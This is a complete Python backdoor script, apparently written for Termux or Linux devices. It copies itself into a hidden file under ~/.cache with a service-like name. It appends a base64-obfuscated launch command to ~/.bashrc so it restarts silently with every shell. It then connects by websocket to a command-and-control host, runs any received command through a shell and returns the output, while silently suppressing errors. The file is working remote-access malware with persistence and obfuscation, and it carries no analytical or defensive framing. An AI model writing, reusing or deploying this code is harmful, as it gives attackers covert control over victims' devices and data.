
import asyncio
import subprocess
import websockets
import base64
from pathlib import Path

home = Path.home()
workdir = home / ".cache"
async def starting_persistence():
    bashrc = home / ".bashrc"
    script = Path(__file__).resolve()
    target_script = workdir / ".termux_essential_deamon"

    workdir.mkdir(parents=True,exist_ok=True)
    target_script.touch(mode=0o666, exist_ok=True)


    with target_script.open("a") as f:
        content = script.read_text()
        target_script.write_text(content)

    if bashrc.exists():
        with open(bashrc, "a") as f:
            init_command = f"python {target_script} &>/dev/null & disown"
            b64_command = base64.b64encode(init_command.encode()).decode()
            cmd = f"echo '{b64_command}' | base64 -d | bash\n"
            f.write(cmd)

async def main():
    verify_execution = workdir / ".yes"
    if not verify_execution.exists():
        await starting_persistence()

    try:
        async with websockets.connect(f"ws://{service_c2_host}:{service_c2_port}") as websocket:
            while True:
                try:
                    command = await websocket.recv()
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True
                    )
                    output = result.stdout + result.stderr
                    if not output:
                        output = " "
                    await websocket.send(output)
                except websockets.ConnectionClosed:
                    break
                except:
                    pass
    except:
        pass


def run():
   asyncio.run(main())

if __name__ == "__main__":
   run()

